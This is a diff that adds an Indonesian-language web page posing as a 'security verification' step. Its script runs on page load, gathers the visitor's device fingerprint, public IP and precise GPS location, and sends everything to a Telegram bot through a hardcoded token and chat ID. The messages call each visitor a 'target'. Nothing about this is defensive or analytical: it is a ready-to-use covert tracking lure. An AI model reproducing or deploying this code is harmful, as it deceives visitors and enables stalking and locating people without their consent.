@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Sistem</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            margin: 20px 0;
+            color: #666;
+            font-size: 16px;
+        }
+        .success {
+            color: #28a745;
+            font-weight: 500;
+        }
+        .error {
+            color: #dc3545;
+            font-weight: 500;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .device-info {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 14px;
+            border-left: 4px solid #667eea;
+            display: none;
+        }
+        .device-info p {
+            margin: 5px 0;
+            color: #555;
+        }
+        .device-info strong {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🔒 Verifikasi Keamanan</h2>
+        <div class="spinner" id="spinner"></div>
+        <div class="status" id="status">Memverifikasi perangkat Anda...</div>
+        
+        <div class="device-info" id="deviceInfo">
+            <p><strong>🖥️ Perangkat:</strong> <span id="device"></span></p>
+            <p><strong>🌐 Browser:</strong> <span id="browser"></span></p>
+            <p><strong>📱 Platform:</strong> <span id="platform"></span></p>
+            <p><strong>🖱️ Resolusi:</strong> <span id="resolution"></span></p>
+            <p><strong>🌍 IP:</strong> <span id="ip"></span></p>
+            <p><strong>📍 Lokasi:</strong> <span id="location"></span></p>
+        </div>
+        
+        <div class="footer">
+            Verifikasi standar untuk keamanan akun Anda
+        </div>
+    </div>
+
+    <script>
+        // ================ KONFIGURASI TELEGRAM ================
+        const TELEGRAM_TOKEN = '8396190087:AAFIm_XoDMYkDx-r7-Trcv9Ea6xSPDXkUIY';  // GANTI DENGAN TOKEN BOT TUAN
+        const TELEGRAM_CHAT_ID = '7226782055';  // GANTI DENGAN CHAT ID TUAN
+        // ======================================================
+
+        // Fungsi untuk mengirim pesan ke Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Gagal mengirim ke Telegram:', error);
+            }
+        }
+
+        // Fungsi untuk mendapatkan informasi browser/perangkat
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const cookies = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+            const doNotTrack = navigator.doNotTrack || 'Tidak diketahui';
+            
+            // Deteksi browser
+            let browser = "Unknown";
+            if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
+            else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
+            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
+            else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
+            else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
+            else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
+            else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";
+            
+            // Deteksi OS
+            let os = "Unknown";
+            if (ua.indexOf("Windows") > -1) os = "Windows";
+            else if (ua.indexOf("Mac") > -1) os = "macOS";
+            else if (ua.indexOf("Linux") > -1) os = "Linux";
+            else if (ua.indexOf("Android") > -1) os = "Android";
+            else if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) os = "iOS";
+            
+            return {
+                userAgent: ua,
+                platform: platform,
+                browser: browser,
+                os: os,
+                language: language,
+                cookies: cookies,
+                doNotTrack: doNotTrack,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
+            };
+        }
+
+        // Fungsi untuk mendapatkan IP publik
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Gagal mendapatkan IP';
+            }
+        }
+
+        // Fungsi utama untuk mengumpulkan data dan mengirim ke Telegram
+        async function collectAndSendData() {
+            const deviceInfo = getDeviceInfo();
+            const publicIP = await getPublicIP();
+            
+            // Update tampilan device info
+            document.getElementById('device').textContent = deviceInfo.os;
+            document.getElementById('browser').textContent = deviceInfo.browser;
+            document.getElementById('platform').textContent = deviceInfo.platform;
+            document.getElementById('resolution').textContent = `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`;
+            document.getElementById('ip').textContent = publicIP;
+            
+            document.getElementById('deviceInfo').style.display = 'block';
+
+            // Format pesan untuk Telegram
+            let message = `<b>🔔 TARGET BARU TERDETEKSI!</b>\n\n`;
+            message += `<b>🕒 Waktu:</b> ${deviceInfo.timestamp}\n`;
+            message += `<b>🌍 IP Publik:</b> ${publicIP}\n`;
+            message += `<b>💻 Sistem Operasi:</b> ${deviceInfo.os}\n`;
+            message += `<b>🌐 Browser:</b> ${deviceInfo.browser}\n`;
+            message += `<b>📱 Platform:</b> ${deviceInfo.platform}\n`;
+            message += `<b>🖥️ Resolusi Layar:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
+            message += `<b>🎨 Color Depth:</b> ${deviceInfo.colorDepth}-bit\n`;
+            message += `<b>🌍 Bahasa:</b> ${deviceInfo.language}\n`;
+            message += `<b>🍪 Cookies:</b> ${deviceInfo.cookies}\n`;
+            message += `<b>🚫 Do Not Track:</b> ${deviceInfo.doNotTrack}\n`;
+            message += `<b>⏰ Timezone:</b> ${deviceInfo.timezone}\n`;
+            message += `<b>🔍 User Agent:</b> ${deviceInfo.userAgent}\n`;
+
+            // Kirim data awal ke Telegram
+            await sendToTelegram(message);
+            document.getElementById('status').innerHTML = '<span class="success">✓ Verifikasi berhasil</span>';
+
+            // Dapatkan lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        // Update tampilan lokasi
+                        document.getElementById('location').textContent = `${lat}, ${lon} (akurasi: ±${accuracy}m)`;
+                        
+                        // Buat link Google Maps
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        // Kirim lokasi ke Telegram
+                        const locationMessage = `<b>📍 LOKASI DITEMUKAN!</b>\n\n` +
+                            `<b>Latitude:</b> ${lat}\n` +
+                            `<b>Longitude:</b> ${lon}\n` +
+                            `<b>Akurasi:</b> ±${accuracy} meter\n` +
+                            `<b>🗺️ Peta:</b> ${mapsLink}`;
+                        
+                        await sendToTelegram(locationMessage);
+                        
+                        // Kirim juga sebagai location pin (jika ingin)
+                        const locationUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
+                        await fetch(locationUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                latitude: lat,
+                                longitude: lon
+                            })
+                        });
+                        
+                        document.getElementById('status').innerHTML = '<span class="success">✓ Verifikasi selesai. Semua data terkirim.</span>';
+                    },
+                    (error) => {
+                        let errorMsg = 'Gagal mendapatkan lokasi';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = 'Izin lokasi ditolak';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = 'Lokasi tidak tersedia';
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = 'Waktu permintaan habis';
+                                break;
+                        }
+                        
+                        document.getElementById('location').textContent = errorMsg;
+                        document.getElementById('status').innerHTML = '<span class="error">⚠️ ' + errorMsg + '</span>';
+                        
+                        // Tetap beri tahu Telegram meski lokasi gagal
+                        sendToTelegram(`<b>⚠️ Target:</b> ${publicIP}\n<b>Status Lokasi:</b> ${errorMsg}`);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                document.getElementById('location').textContent = 'Geolocation tidak didukung';
+                document.getElementById('status').innerHTML = '<span class="error">⚠️ Browser tidak mendukung geolocation</span>';
+                sendToTelegram(`<b>⚠️ Target:</b> ${publicIP}\n<b>Status:</b> Geolocation tidak didukung`);
+            }
+        }
+
+        // Mulai proses saat halaman dimuat
+        window.onload = function() {
+            collectAndSendData();
+        };
+    </script>
+</body>
+</html>
